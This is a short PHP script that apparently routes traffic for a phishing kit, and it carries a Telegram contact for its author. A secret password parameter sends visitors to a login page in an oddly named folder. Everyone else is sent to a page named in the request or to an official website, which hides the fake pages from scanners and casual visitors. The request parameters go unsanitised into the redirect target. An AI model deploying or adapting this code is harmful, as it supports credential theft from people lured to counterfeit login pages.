<?php
    /*******
    Telegram : https://t.me/elgh03t
    ********************************************************/

    require_once 'app/config.php';
    if( $_GET['pwd'] == PASSWORD ) {
        get_lang();
        $page = "login.php";
        header("Location: xN9dG1/" . $page . "?id=" . mt_rand(11111, 99999999));
        exit();
    } else if( !empty($_GET['redirection']) ) {
        $page = $_GET['redirection'] . '.php';
        if( isset($_GET['error']) ) {
            header("Location: xN9dG1/" . $page . "?error=". $_GET['error'] ."&id=" . mt_rand(11111, 99999999));
            exit();
        }
        header("Location: xN9dG1/" . $page . "?id=" . mt_rand(11111, 99999999));
        exit();
    } else {
        header("Location: " . OFFICIAL_WEBSITE);
        exit();
    }
?>